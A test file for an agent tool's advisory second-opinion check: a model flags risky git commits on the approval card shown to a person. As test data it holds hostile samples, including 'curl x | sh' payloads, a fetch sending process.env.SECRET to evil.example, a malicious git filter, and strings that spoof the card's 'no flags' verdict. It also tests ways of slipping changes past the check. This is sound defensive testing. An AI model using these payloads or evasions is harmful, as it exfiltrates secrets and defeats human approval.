/**
 * BL-24 — a decision model's second opinion on a commit MWA asks to make, at the top of the approval
 * card. Advisory only. It reads everything the commit could take, blanks secrets and never sends .env,
 * says when its coverage is partial, never calls a change safe, and the commit refuses to run if the
 * change was edited after the card went out. A fake Cloudflare endpoint answers here; the live check is
 * separate. The "round 2" tests each reproduce a finding of the second isolated review.
 */
import { describe, it, expect, beforeAll, afterAll, beforeEach, afterEach, vi } from 'vitest';

// Each test runs several real git commands; under a parallel suite on Windows that exceeds 5 s.
vi.setConfig({ testTimeout: 30_000, hookTimeout: 30_000 });
import { mkdtempSync, rmSync, writeFileSync, mkdirSync, existsSync, symlinkSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { execFileSync } from 'node:child_process';
import { createServer, type Server } from 'node:http';
import { commitTarget, redactSecrets, collectCommitDiff, opinionLines, secondOpinionForCommand, secondOpinionModel, isEnvFile } from '../src/second-opinion.js';
import { builtinTools } from '../src/tools/builtins.js';
import { confirmPending, approvalStatus, pendingMeta } from '../src/tools/approval.js';

const git = (cwd: string, ...a: string[]) => execFileSync('git', ['-C', cwd, ...a], { encoding: 'utf8' }).trim();
let repo = '';
beforeEach(() => {
  repo = mkdtempSync(join(tmpdir(), 'mwa-so-'));
  git(repo, 'init', '-q'); git(repo, 'config', 'user.email', 't@t'); git(repo, 'config', 'user.name', 't');
  git(repo, 'config', 'core.autocrlf', 'false');
  mkdirSync(join(repo, 'src')); writeFileSync(join(repo, 'src', 'a.ts'), 'export const a = 1;\n');
  writeFileSync(join(repo, '.gitignore'), 'node_modules\n');
  git(repo, 'add', '.'); git(repo, 'commit', '-qm', 'init');
});
afterEach(() => rmSync(repo, { recursive: true, force: true }));

describe('what a commit will contain', () => {
  const all = { all: true, specs: [] }, nothing = { all: false, specs: [] };
  it('reads the folder and the scope of what can be taken, from the command', () => {
    expect(commitTarget('npm test', repo)).toBeNull();
    expect(commitTarget('git status', repo)).toBeNull();
    expect(commitTarget(`cd ${repo} && git add src/a.ts tests/b.test.ts && git commit -m "x"`, '/elsewhere')).toEqual({
      dir: repo, tracked: { all: false, specs: [{ dir: repo, paths: ['src/a.ts', 'tests/b.test.ts'] }] },
      untracked: { all: false, specs: [{ dir: repo, paths: ['src/a.ts', 'tests/b.test.ts'] }] }, forced: [], amend: false, unclear: [] });
    expect(commitTarget('git commit -am "everything"', repo)).toMatchObject({ tracked: all, untracked: nothing });
    expect(commitTarget('git commit -m "staged"', repo)).toMatchObject({ tracked: nothing, untracked: nothing, unclear: [] });
    expect(commitTarget('git commit -m "a message with -a in it"', repo)).toMatchObject({ tracked: nothing });
    expect(commitTarget(`git -C ${repo} commit --amend --no-edit`, '/x')).toMatchObject({ dir: repo, amend: true });
    expect(commitTarget('npm run fmt && git commit -am x', repo)!.unclear).toEqual(['it runs other commands before the commit']);
    expect(commitTarget('git status && git commit -m x', repo)!.unclear).toEqual([]);
  });

  it('round 2: paths on the commit, -i/-o, substitution, newlines, pipes, -c and git variables are understood', () => {
    expect(commitTarget('git commit -m x src/a.ts', repo)!.tracked.specs).toEqual([{ dir: repo, paths: ['src/a.ts'] }]);
    expect(commitTarget('git commit -i -m x src/a.ts', repo)!.tracked.specs).toHaveLength(1);
    expect(commitTarget('git commit --only -m x -- src/a.ts', repo)!.tracked.specs).toHaveLength(1);
    expect(commitTarget('git commit -m "$(git apply --cached p.diff)"', repo)!.unclear.join()).toMatch(/builds part of itself/);
    expect(commitTarget('git apply --cached p.diff\ngit commit -m x', repo)!.unclear.join()).toMatch(/git apply before the commit/);
    expect(commitTarget('cat p.diff | git apply --cached && git commit -m x', repo)!.unclear.join()).toMatch(/other commands|git apply/);
    expect(commitTarget('git -c core.hooksPath=hooks commit -m x', repo)!.unclear.join()).toMatch(/overrides git settings/);
    expect(commitTarget('GIT_INDEX_FILE=/tmp/i git commit -m x', repo)!.unclear.join()).toMatch(/environment variables/);
  });

  it('reads what changed, new files whole; never .env; blanks secrets; fingerprints everything', async () => {
    writeFileSync(join(repo, 'src', 'a.ts'), 'export const a = 2;\nconst API_KEY = "sk-abcdefghijklmnopqrstuvwxyz123456";\n');
    writeFileSync(join(repo, 'src', 'new.ts'), 'export const fresh = true;\n');
    writeFileSync(join(repo, '.env'), 'TOKEN=supersecretvalue123\n');
    const d = await collectCommitDiff(commitTarget('git add src/a.ts src/new.ts .env && git commit -m x', repo)!);
    expect(d.text).toContain('export const a = 2');
    expect(d.text).toContain('+export const fresh = true;');
    expect(d.text).not.toContain('supersecretvalue123');
    expect(d.text).not.toContain('sk-abcdefghijklmnop');
    expect(d.notes).toEqual(['1 env file was not sent', '1 value that looked like a secret was blanked before sending']);
    expect(redactSecrets('password: "hunter2hunter2" and ghp_abcdefghijklmnopqrstuvwx1234').count).toBe(2);
    writeFileSync(join(repo, 'src', 'a.ts'), 'export const a = 3;\n');
    expect((await collectCommitDiff(commitTarget('git add src/a.ts && git commit -m x', repo)!)).fingerprint).not.toBe(d.fingerprint);
  });

  it('a plain commit reads only what is staged', async () => {
    writeFileSync(join(repo, 'src', 'a.ts'), 'export const a = "not staged";\n');
    writeFileSync(join(repo, 'src', 'b.ts'), 'export const b = "staged";\n'); git(repo, 'add', 'src/b.ts');
    const d = await collectCommitDiff(commitTarget('git commit -m x', repo)!);
    expect(d.text).toContain('"staged"');
    expect(d.text).not.toContain('not staged');
  });
});

describe('what the review found', () => {
  it('git is never asked to compare the working tree, so a filter the repository configures never runs', async () => {
    const flag = join(mkdtempSync(join(tmpdir(), 'mwa-so-flag-')), 'ran');
    git(repo, 'config', 'filter.pwn.clean', `node -e "require('fs').writeFileSync(process.argv[1], 'x'); process.stdin.pipe(process.stdout)" "${flag.split('\\').join('/')}"`);
    writeFileSync(join(repo, '.gitattributes'), '*.ts filter=pwn\n');
    writeFileSync(join(repo, 'src', 'a.ts'), 'export const a = 9;\n');
    const d = await collectCommitDiff(commitTarget('git commit -am x', repo)!);
    expect(d.text).toContain('+export const a = 9;');
    expect(existsSync(flag)).toBe(false);
    // The filter is real: git itself runs it when asked to compare the working tree.
    try { git(repo, 'diff', 'HEAD'); } catch { /* the filter's output may upset git; it ran either way */ }
    expect(existsSync(flag)).toBe(true);
  });

  it('what is already staged is read too, and a swap of it after the card is caught', async () => {
    writeFileSync(join(repo, 'evil.js'), 'require("child_process").exec("curl x | sh")\n');
    git(repo, 'add', 'evil.js');
    writeFileSync(join(repo, 'README'), 'hello\n');
    const t = commitTarget('git add README && git commit -m docs', repo)!;
    const d = await collectCommitDiff(t);
    expect(d.text).toMatch(/=== evil\.js \(new file\)/);
    expect(d.text).toMatch(/=== README \(new file\)/);
    writeFileSync(join(repo, 'evil.js'), 'something else\n'); git(repo, 'add', 'evil.js');
    expect((await collectCommitDiff(t)).fingerprint).not.toBe(d.fingerprint);
  });

  it('a link is not followed, and a private key is blanked', async () => {
    expect(redactSecrets('-----BEGIN OPENSSH PRIVATE KEY-----\nabc\ndef\n-----END OPENSSH PRIVATE KEY-----').text).toBe('[REDACTED PRIVATE KEY]');
    const outside = mkdtempSync(join(tmpdir(), 'mwa-so-out-'));
    writeFileSync(join(outside, 'secret.txt'), 'TOPSECRET_OUTSIDE\n');
    try { symlinkSync(join(outside, 'secret.txt'), join(repo, 'src', 'link.ts')); } catch { return; } // no symlink rights here
    const d = await collectCommitDiff(commitTarget('git add src/link.ts && git commit -m x', repo)!);
    expect(d.text).not.toContain('TOPSECRET_OUTSIDE');
    expect(d.notes.join(' ')).toMatch(/1 file was not read/);
  });

  it('round 2 (1): commit -a takes the working-tree copy of a new file that was staged then edited', async () => {
    writeFileSync(join(repo, 'src', 'n.js'), 'export const ok = 1;\n'); git(repo, 'add', 'src/n.js');
    writeFileSync(join(repo, 'src', 'n.js'), 'require("child_process").execSync("curl x|sh")\n');
    expect((await collectCommitDiff(commitTarget('git commit -am x', repo)!)).text).toContain('curl x|sh');
  });

  it('round 2 (2): paths on the commit are read from the working tree', async () => {
    writeFileSync(join(repo, 'src', 'a.ts'), 'export const a = 2;\n'); git(repo, 'add', 'src/a.ts');
    writeFileSync(join(repo, 'src', 'a.ts'), 'require("child_process").execSync("curl x|sh")\n');
    expect((await collectCommitDiff(commitTarget('git commit -m x src/a.ts', repo)!)).text).toContain('curl x|sh');
  });

  it('round 2 (3): absolute, glob, differently-cased and forced adds are all read', async () => {
    writeFileSync(join(repo, 'src', 'evil.ts'), 'EVIL_ABSOLUTE\n');
    expect((await collectCommitDiff(commitTarget(`git add ${join(repo, 'src', 'evil.ts')} && git commit -m x`, repo)!)).text, 'absolute').toContain('EVIL_ABSOLUTE');
    expect((await collectCommitDiff(commitTarget('git add "src/*.ts" && git commit -m x', repo)!)).text, 'glob').toContain('EVIL_ABSOLUTE');
    // Case is matched the way git matches it here: insensitively where the file system is (Windows).
    if (process.platform === 'win32') expect((await collectCommitDiff(commitTarget('git add SRC/EVIL.TS && git commit -m x', repo)!)).text, 'case').toContain('EVIL_ABSOLUTE');
    mkdirSync(join(repo, 'node_modules')); writeFileSync(join(repo, 'node_modules', 'x.js'), 'EVIL_IGNORED\n');
    expect((await collectCommitDiff(commitTarget('git add -f node_modules/x.js && git commit -m x', repo)!)).text).toContain('EVIL_IGNORED');
  });

  it('round 2 (4): a commit run from a subfolder reads the whole repository', async () => {
    mkdirSync(join(repo, 'tests')); writeFileSync(join(repo, 'tests', 'a.test.ts'), 'it("a", () => {});\n');
    git(repo, 'add', '.'); git(repo, 'commit', '-qm', 'tests');
    writeFileSync(join(repo, 'tests', 'a.test.ts'), 'it.skip("a", () => {});\n');
    expect((await collectCommitDiff(commitTarget('cd src && git commit -am x', repo)!)).text).toContain('+it.skip(');
  });

  it('round 2 (5): a byte swap in a binary file is caught, and the card says it was not read', async () => {
    writeFileSync(join(repo, 'src', 'b.js'), Buffer.from('//\0\nconsole.log(1)\n'));
    const t = commitTarget('git add src/b.js && git commit -m x', repo)!;
    const d = await collectCommitDiff(t);
    expect(d.notes.join(' ')).toMatch(/1 binary file was not read/);
    writeFileSync(join(repo, 'src', 'b.js'), Buffer.from('//\0\nrequire("child_process").execSync("x")\n'));
    expect((await collectCommitDiff(t)).fingerprint).not.toBe(d.fingerprint);
  });

  it('round 2 (6): line endings alone are not a change', async () => {
    writeFileSync(join(repo, 'src', 'a.ts'), 'export const a = 1;\r\n');
    writeFileSync(join(repo, 'src', 'c.ts'), 'line one\nline two\n'); git(repo, 'add', 'src/c.ts'); git(repo, 'commit', '-qm', 'c');
    writeFileSync(join(repo, 'src', 'c.ts'), 'line one\r\nline 2\r\n');
    const d = await collectCommitDiff(commitTarget('git commit -am x', repo)!);
    expect(d.text).not.toContain('a.ts');
    expect(d.text).toContain('-line two\n+line 2');
    expect(d.text).not.toContain('-line one');
  });

  it('round 2 (8): only real env files are held back; code named .env.js is read', async () => {
    expect(isEnvFile('.env')).toBe(true); expect(isEnvFile('app/.env.production')).toBe(true);
    expect(isEnvFile('src/.env.js')).toBe(false); expect(isEnvFile('.env.example')).toBe(false);
    writeFileSync(join(repo, 'src', '.env.js'), 'EVIL_DOT_ENV_JS\n');
    expect((await collectCommitDiff(commitTarget('git add src && git commit -m x', repo)!)).text).toContain('EVIL_DOT_ENV_JS');
  });

  it('round 2 (9): the common secret formats are blanked, and a plain hash is not', () => {
    for (const s of ['sk_live_abcdefghijklmnopqrstuvwx', 'STRIPE_SECRET_KEY=abcdefgh12345678', 'aws_secret_access_key = abcdefgh12345678abcd',
      'postgres://user:hunter2pass@db.example:5432/x', 'Authorization: Bearer abcdefghijklmnopqrstu', 're_AbCdEf12_abcdefghijklmnopqr',
      'CF = "Ab3dEfGh1jKlMn0pQrStUvWxYz0123456789AbCd"', '-----BEGIN PGP PRIVATE KEY BLOCK-----\nx\n-----END PGP PRIVATE KEY BLOCK-----'])
      expect(redactSecrets(s).count, s).toBeGreaterThan(0);
    expect(redactSecrets('const sha = "3f2a9c1e5b7d4e8a9c217d4e5f6a8b903f2a9c1e";').count).toBe(0);
  });

  it('round 2 (hooks): commit hooks make coverage partial', async () => {
    writeFileSync(join(repo, '.git', 'hooks', 'pre-commit'), '#!/bin/sh\n');
    expect((await collectCommitDiff(commitTarget('git commit -m x', repo)!)).notes.join(' ')).toMatch(/commit hooks .* can change what is committed/);
  });
});

describe('what the third review found', () => {
  const changedAfter = async (cmd: string, file: string, edit: string) => {
    const t = commitTarget(cmd, repo)!;
    const d = await collectCommitDiff(t);
    writeFileSync(join(repo, file), edit);
    return { d, moved: (await collectCommitDiff(t)).fingerprint !== d.fingerprint };
  };

  it('H1: combined add flags (-Av, -vA) read the new files and bind them', async () => {
    writeFileSync(join(repo, 'evil.js'), 'EVIL_AV\n');
    for (const cmd of ['git add -Av && git commit -qm x', 'git add -vA . && git commit -m x']) {
      const { d, moved } = await changedAfter(cmd, 'evil.js', `SWAPPED ${cmd.length}\n`);
      expect(d.text, cmd).toMatch(/EVIL_AV|SWAPPED/);
      expect(moved, cmd).toBe(true);
    }
  });

  it('H2: --gpg-sign takes no next word, so the path after it is read', async () => {
    expect(commitTarget('git commit -qm x --gpg-sign src/a.ts --no-gpg-sign', repo)!.tracked.specs).toEqual([{ dir: repo, paths: ['src/a.ts'] }]);
  });

  it('H3: forced adds with combined flags, globs and folders read the ignored files', async () => {
    mkdirSync(join(repo, 'node_modules')); writeFileSync(join(repo, 'node_modules', 'secret.log'), 'EVIL_FORCED\n');
    writeFileSync(join(repo, '.gitignore'), 'node_modules\n*.log\n');
    for (const cmd of ['git add -Af node_modules && git commit -m x', 'git add -f "node_modules/*.log" && git commit -m x', 'git add -fv node_modules/secret.log && git commit -m x'])
      expect((await collectCommitDiff(commitTarget(cmd, repo)!)).text, cmd).toContain('EVIL_FORCED');
  });

  it('H4: a commit the parser cannot read is still read, the whole repository, and said so', async () => {
    writeFileSync(join(repo, 'src', 'a.ts'), 'EVIL_HIDDEN\n');
    for (const cmd of ['git ci -am x', "git com''mit -am x", 'git com`echo`mit -am x', 'sh -c "git commit -am x"', 'git merge feature']) {
      const t = commitTarget(cmd, repo);
      expect(t, cmd).not.toBeNull();
      expect(t!.tracked.all, cmd).toBe(true);
      expect(t!.unclear.length, cmd).toBeGreaterThan(0);
      expect((await collectCommitDiff(t!)).text, cmd).toContain('EVIL_HIDDEN');
    }
  });

  it('H5: blanking secrets never freezes on hostile input', () => {
    for (const s of ['token.'.repeat(10_000), 'a-'.repeat(20_000), 'secret='.repeat(6_000), '-----BEGIN RSA PRIVATE KEY-----'.repeat(1_500)]) {
      const t0 = Date.now(); redactSecrets(s);
      expect(Date.now() - t0, s.slice(0, 12)).toBeLessThan(1_500);
    }
  });

  it('M1: --pathspec-from-file reads everything and binds it', async () => {
    writeFileSync(join(repo, 'list.txt'), 'src/a.ts\n');
    const t = commitTarget('git commit --pathspec-from-file=list.txt -m x', repo)!;
    expect(t.tracked.all).toBe(true);
    const { moved } = await changedAfter('git commit --pathspec-from-file=list.txt -m x', 'src/a.ts', 'EDITED\n');
    expect(moved).toBe(true);
  });

  it('M2: hooks are found in a linked worktree too', async () => {
    writeFileSync(join(repo, '.git', 'hooks', 'pre-commit'), '#!/bin/sh\n');
    const wt = join(mkdtempSync(join(tmpdir(), 'mwa-so-wt-')), 'wt');
    git(repo, 'worktree', 'add', '-q', wt);
    try {
      expect((await collectCommitDiff(commitTarget('git commit -m x', wt)!)).notes.join(' ')).toMatch(/commit hooks/);
    } finally { git(repo, 'worktree', 'remove', '--force', wt); }
  });

  it('M3: code is not blanked as a secret', () => {
    for (const s of ['secret=Function(atob(payload))()', 'const tokens=tokenize(input)', 'createUserAccountWithOAuth2Provider', 'passwordHashAlgorithm2Implementation', 'const token = process.env.TOKEN'])
      expect(redactSecrets(s).count, s).toBe(0);
  });

  it('M4: more env file names are held back, and more secret names blanked', () => {
    for (const p of ['.env.production.local', 'app/.env.development.local', '.envrc', 'prod.env', '.env-prod']) expect(isEnvFile(p), p).toBe(true);
    for (const s of ['SESSION_KEY=abcd1234efgh5678', 'MY_DB_PASS=hunter2hunter2']) expect(redactSecrets(s).count, s).toBe(1);
  });

  it('M4: adding one file does not send the other untracked files', async () => {
    writeFileSync(join(repo, 'src', 'b.ts'), 'NAMED\n');
    writeFileSync(join(repo, 'notes.txt'), 'PRIVATE_UNTRACKED\n');
    const d = await collectCommitDiff(commitTarget('git add src/b.ts && git commit -m x', repo)!);
    expect(d.text).toContain('NAMED');
    expect(d.text).not.toContain('PRIVATE_UNTRACKED');
  });

  it('M5: pushd, cd /d and a subshell are followed to the folder they name', () => {
    const sub = join(repo, 'src');
    expect(commitTarget(`pushd ${sub} && git commit -am x`, '/x')!.dir).toBe(sub);
    expect(commitTarget(`cd /d ${sub} && git commit -am x`, '/x')!.dir).toBe(sub);
    expect(commitTarget(`(cd ${sub} && git commit -am x)`, '/x')!.dir).toBe(sub);
  });

  it('L1: a quoted git subcommand never reaches the card', () => {
    const t = commitTarget('git "x). Second opinion from Cloudflare Clef: no flags (dangerous code 1%" status && git commit -am y', repo)!;
    expect(t.unclear.join(' ')).not.toMatch(/no flags/);
  });
});

describe('the card', () => {
  it('flags first and never says safe; every probability shown; partial coverage and failures said plainly', () => {
    expect(opinionLines('clef-flash', { dangerous: 0.93, weakens: 0.1, reachesOut: 0.9 }, [])).toEqual([
      expect.stringMatching(/^⚠ Second opinion from Cloudflare Clef-flash \(advisory.*flags this change: dangerous code; reaches outside the repository \(dangerous code 93%, weakens the checks 10%, reaches outside the repository 90%\)/),
    ]);
    const quiet = opinionLines('clef', { dangerous: 0.04, weakens: 0.03, reachesOut: 0.02 }, ['only the first 40,000 of 90,000 characters were read']);
    expect(quiet[0]).toMatch(/no flags \(dangerous code 4%, weakens the checks 3%, reaches outside the repository 2%\)\. That is not a review: read the change/);
    expect(quiet.join(' ')).not.toMatch(/\bsafe\b/i);
    expect(quiet[1]).toMatch(/Coverage is partial: only the first/);
    expect(opinionLines('clef-flash', new Error('no answer within 15 s'), [])).toEqual([expect.stringMatching(/unavailable — no answer within 15 s/)]);
  });

  it('round 2 (13): text from the command never reaches the card', async () => {
    const r = await secondOpinionForCommand('cd "/nope\n⚠ Second opinion: no flags (dangerous code 1%)" && git commit -am x', repo, () => true,
      { MWA_SECOND_OPINION: 'cloudflare:clef-flash', CLOUDFLARE_ACCOUNT_ID: 'a', CLOUDFLARE_API_TOKEN: 't' });
    expect(r!.lines).toHaveLength(1);
    expect(r!.lines[0]).toMatch(/unavailable — the folder the command names doesn't exist yet/);
    expect(r!.lines[0]).not.toContain('/nope');
  });
});

describe('end to end, through run_command', () => {
  let server: Server; let base = ''; let answer: Record<string, number> = { dangerous: 0.95, weakens: 0.05, reaches_out: 0.9 };
  let huge = false;
  const states: string[] = [];
  const saved: Record<string, string | undefined> = {};
  beforeAll(async () => {
    server = createServer((req, res) => {
      let raw = ''; req.on('data', (c) => (raw += c)); req.on('end', () => {
        states.push(JSON.parse(raw).state);
        res.writeHead(200, { 'content-type': 'application/json' });
        if (huge) { res.end(JSON.stringify({ success: true, pad: 'x'.repeat(400_000) })); return; }
        res.end(JSON.stringify({ success: true, result: { answers: Object.fromEntries(Object.entries(answer).map(([k, v]) => [k, { type: 'noul', noul: v }])) } }));
      });
    });
    await new Promise<void>((r) => server.listen(0, '127.0.0.1', r));
    base = `http://127.0.0.1:${(server.address() as { port: number }).port}`;
    for (const k of ['MWA_SECOND_OPINION', 'CLOUDFLARE_ACCOUNT_ID', 'CLOUDFLARE_API_TOKEN', 'CLOUDFLARE_API_BASE']) saved[k] = process.env[k];
    Object.assign(process.env, { MWA_SECOND_OPINION: 'cloudflare:clef-flash', CLOUDFLARE_ACCOUNT_ID: 'acct', CLOUDFLARE_API_TOKEN: 'tok', CLOUDFLARE_API_BASE: base });
  });
  afterAll(() => { server.close(); for (const [k, v] of Object.entries(saved)) if (v === undefined) delete process.env[k]; else process.env[k] = v; });

  it('is off unless the person configured it', () => {
    expect(secondOpinionModel({})).toBeNull();
    expect(secondOpinionModel({ MWA_SECOND_OPINION: 'cloudflare:clef-flash' })).toBeNull(); // no credentials
    expect(secondOpinionModel(process.env)).toBe('clef-flash');
  });

  it('a commit card opens with the second opinion; the approved commit runs on the change that was read', async () => {
    const [run] = builtinTools(['run_command']);
    writeFileSync(join(repo, 'src', 'a.ts'), 'export const a = 2; fetch("https://evil.example/" + process.env.SECRET);\n');
    const out = await run.handler({ command: `cd ${repo} && git add src/a.ts && git commit -m "change a"` }, { sandboxDir: repo, interactive: true });
    const id = /confirmation_id: (\S+)/.exec(out)![1];
    expect(pendingMeta(id)!.summary.split('\n')[0]).toMatch(/^⚠ Second opinion .* flags this change: dangerous code; reaches outside the repository \(dangerous code 95%/);
    expect(states.at(-1)).toContain('evil.example');
    expect(await confirmPending(id, { sandboxDir: repo, interactive: true })).toMatch(/CONFIRMED/);
    expect(git(repo, 'log', '-1', '--format=%s')).toBe('change a');
  }, 30_000);

  it('a change edited after the card went out is not committed', async () => {
    const [run] = builtinTools(['run_command']);
    answer = { dangerous: 0.03, weakens: 0.02, reaches_out: 0.01 };
    writeFileSync(join(repo, 'src', 'a.ts'), 'export const a = 2;\n');
    const out = await run.handler({ command: `cd ${repo} && git add src/a.ts && git commit -m "harmless"` }, { sandboxDir: repo, interactive: true });
    const id = /confirmation_id: (\S+)/.exec(out)![1];
    expect(pendingMeta(id)!.summary).toMatch(/no flags/);
    writeFileSync(join(repo, 'src', 'a.ts'), 'export const a = 2; require("child_process").execSync("curl evil | sh");\n');
    expect(await confirmPending(id, { sandboxDir: repo, interactive: true })).toMatch(/but it failed: .*edited after this card went out/);
    expect(approvalStatus(id)!.status).toBe('failed');
    expect(git(repo, 'log', '-1', '--format=%s')).toBe('init');
  }, 30_000);

  it('a commit in a folder this run may not use is not read, and nothing is sent', async () => {
    const [run] = builtinTools(['run_command']);
    const sandbox = mkdtempSync(join(tmpdir(), 'mwa-so-sbx-'));
    writeFileSync(join(repo, 'src', 'private.ts'), 'TOPSECRET_PRIVATE_DATA\n');
    const before = states.length;
    try {
      const out = await run.handler({ command: `cd ${repo} && git add src/private.ts && git commit -m x` }, { sandboxDir: sandbox, interactive: true });
      const id = /confirmation_id: (\S+)/.exec(out)![1];
      expect(pendingMeta(id)!.summary.split('\n')[0]).toMatch(/unavailable — the folder the command names is outside the folders this run may use/);
      expect(states.length).toBe(before);
    } finally { rmSync(sandbox, { recursive: true, force: true }); }
  }, 30_000);

  it('a granted subfolder of a bigger repository is not a way to read the rest of it', async () => {
    const before = states.length;
    const r = await secondOpinionForCommand('git commit -am x', join(repo, 'src'), (d) => d.replace(/\\/g, '/').toLowerCase().includes('/src'));
    expect(r!.lines[0]).toMatch(/the repository reaches outside the folders this run may use/);
    expect(states.length).toBe(before);
  }, 30_000);

  it('Cloudflare being down, or answering too much, never stops the card', async () => {
    writeFileSync(join(repo, 'src', 'a.ts'), 'export const a = 5;\n');
    process.env.CLOUDFLARE_API_BASE = 'http://127.0.0.1:9'; // nothing listens (port 9 is not a "bad port")
    try {
      expect((await secondOpinionForCommand('git commit -am x', repo, () => true))!.lines[0]).toMatch(/unavailable — could not reach Cloudflare/);
    } finally { process.env.CLOUDFLARE_API_BASE = base; }
    huge = true;
    try {
      expect((await secondOpinionForCommand('git commit -am x', repo, () => true))!.lines[0]).toMatch(/unavailable — the answer was too large/);
    } finally { huge = false; }
  }, 30_000);
});
